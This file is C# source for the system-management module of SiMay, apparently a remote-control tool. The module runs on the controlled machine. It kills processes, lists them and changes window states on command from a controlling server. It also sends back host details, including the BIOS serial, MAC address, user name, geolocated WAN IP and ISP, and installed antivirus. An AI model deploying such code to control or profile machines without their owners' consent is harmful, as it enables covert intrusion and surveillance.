﻿using Microsoft.VisualBasic.Devices;
using SiMay.Basic;
using SiMay.Core;
using SiMay.Core.Common;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Core.Packets;
using SiMay.Core.Packets.SysManager;
using SiMay.ServiceCore.Attributes;
using SiMay.ServiceCore.Extensions;
using SiMay.ServiceCore.Helper;
using SiMay.ServiceCore.ServiceSource;
using SiMay.Sockets.Tcp;
using SiMay.Sockets.Tcp.Session;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using static SiMay.ServiceCore.Win32Api;

namespace SiMay.ServiceCore.ControlService
{
    [ServiceName("系统管理")]
    [ServiceKey("SystemManagerJob")]
    public class SystemService : ServiceManager, IServiceSource
    {
        private ComputerInfo _memoryInfo = new ComputerInfo();
        private PerformanceCounter _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        private PacketModelBinder<TcpSocketSaeaSession> _handlerBinder = new PacketModelBinder<TcpSocketSaeaSession>();
        public override void OnNotifyProc(TcpSocketCompletionNotify notify, TcpSocketSaeaSession session)
        {
            switch (notify)
            {
                case TcpSocketCompletionNotify.OnConnected:
                    break;
                case TcpSocketCompletionNotify.OnSend:
                    break;
                case TcpSocketCompletionNotify.OnDataReceiveing:
                    break;
                case TcpSocketCompletionNotify.OnDataReceived:
                    this._handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
                    break;
                case TcpSocketCompletionNotify.OnClosed:
                    this._handlerBinder.Dispose();
                    this._cpuInfo.Dispose();
                    break;
            }
        }
        [PacketHandler(MessageHead.S_GLOBAL_OK)]
        public void InitializeComplete(TcpSocketSaeaSession session)
        {
            SendAsyncToServer(MessageHead.C_MAIN_ACTIVE_APP,
                new ActiveAppPack()
                {
                    IdentifyId = AppConfiguartion.IdentifyId,
                    ServiceKey = this.GetType().GetServiceKey(),
                    OriginName = Environment.MachineName + "@" + (AppConfiguartion.RemarkInfomation ?? AppConfiguartion.DefaultRemarkInfo)
                });
        }

        [PacketHandler(MessageHead.S_GLOBAL_ONCLOSE)]
        public void CloseSession(TcpSocketSaeaSession session)
            => this.CloseSession();

        [PacketHandler(MessageHead.S_SYSTEM_KILL)]
        public void TryKillProcess(TcpSocketSaeaSession session)
        {
            var processIds = session.CompletedBuffer.GetMessageEntity<SysKillPack>();
            foreach (var id in processIds.ProcessIds)
            {
                try
                {
                    Process.GetProcessById(id).Kill();
                }
                catch { }
            }

            this.SendProcessList();
        }

        [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
        public void SetWindowState(TcpSocketSaeaSession session)
        {
            var pack = session.CompletedBuffer.GetMessageEntity<SysWindowMaxPack>();
            int[] handlers = pack.Handlers;
            int state = pack.State;

            if (state == 0)
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MINIMIZE, 0);
            }
            else
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MAXIMIZE, 0);
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
        public void HandlerGetSystemProcessList(TcpSocketSaeaSession session)
            => this.SendProcessList();

        private void SendProcessList()
        {
            var processList = Process.GetProcesses()
                .OrderBy(p => p.ProcessName)
                .Select(c => new ProcessItem()
                {
                    ProcessId = c.Id,
                    ProcessName = c.ProcessName,
                    ProcessThreadCount = c.Threads.Count,
                    WindowHandler = (int)c.MainWindowHandle,
                    WindowName = c.MainWindowTitle,
                    ProcessMemorySize = ((int)c.WorkingSet64) / 1024,
                    FilePath = this.GetProcessFilePath(c)
                }).ToArray();

            SendAsyncToServer(MessageHead.C_SYSTEM_PROCESS_LIST,
                new ProcessListPack()
                {
                    ProcessList = processList
                });
        }

        private string GetProcessFilePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
        public void HandlerGetSystemInfos(TcpSocketSaeaSession session)
        {
            ThreadHelper.ThreadPoolStart(c =>
            {
                GeoLocationHelper.Initialize();

                var infos = new List<SystemInfoItem>();
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "主板序列号",
                    Value = SystemInfoHelper.BIOSSerialNumber
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "网卡MAC",
                    Value = SystemInfoHelper.GetMacAddress
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "驱动器存储信息",
                    Value = SystemInfoHelper.GetMyDriveInfo
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "运行目录",
                    Value = Application.ExecutablePath
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统版本号",
                    Value = Environment.Version.ToString()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "启动毫秒",
                    Value = Environment.TickCount.ToString()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "登录账户",
                    Value = Environment.UserName
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "被控服务启动时间",
                    Value = AppConfiguartion.RunTime
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统版本",
                    Value = SystemInfoHelper.GetOSFullName
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统核心数",
                    Value = Environment.ProcessorCount.ToString()
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "CPU信息",
                    Value = SystemInfoHelper.GetMyCpuInfo
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "系统内存",
                    Value = (SystemInfoHelper.GetMyMemorySize / 1024 / 1024) + "MB"
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "计算机名称",
                    Value = Environment.MachineName
                });

                infos.Add(new SystemInfoItem()
                {
                    ItemName = "被控服务版本",
                    Value = AppConfiguartion.Version
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "WAN IP",
                    Value = GeoLocationHelper.GeoInfo.Ip
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "LAN IP",
                    Value = SystemInfoHelper.GetLocalIPV4()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "安全软件",
                    Value = SystemInfoHelper.GetAntivirus()
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "国家",
                    Value = GeoLocationHelper.GeoInfo.Country
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "ISP",
                    Value = GeoLocationHelper.GeoInfo.Isp
                });
                infos.Add(new SystemInfoItem()
                {
                    ItemName = "GPU",
                    Value = SystemInfoHelper.GetGpuName()
                });
                var sysInfos = new SystemInfoPack();
                sysInfos.SystemInfos = infos.ToArray();
                SendAsyncToServer(MessageHead.C_SYSTEM_SYSTEMINFO, sysInfos);
            });
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_OCCUPY)]
        public void handlerGetSystemOccupyRate(TcpSocketSaeaSession session)
        {
            string cpuUserate = "-1";
            try
            {
                cpuUserate = ((_cpuInfo.NextValue() / (float)Environment.ProcessorCount)).ToString("0.0") + "%";
            }
            catch { }

            SendAsyncToServer(MessageHead.C_SYSTEM_OCCUPY_INFO,
                new SystemOccupyPack()
                {
                    CpuUsage = cpuUserate,
                    MemoryUsage = (_memoryInfo.TotalPhysicalMemory / 1024 / 1024).ToString() + "MB/" + ((_memoryInfo.TotalPhysicalMemory - _memoryInfo.AvailablePhysicalMemory) / 1024 / 1024).ToString() + "MB"
                });
        }
    }
}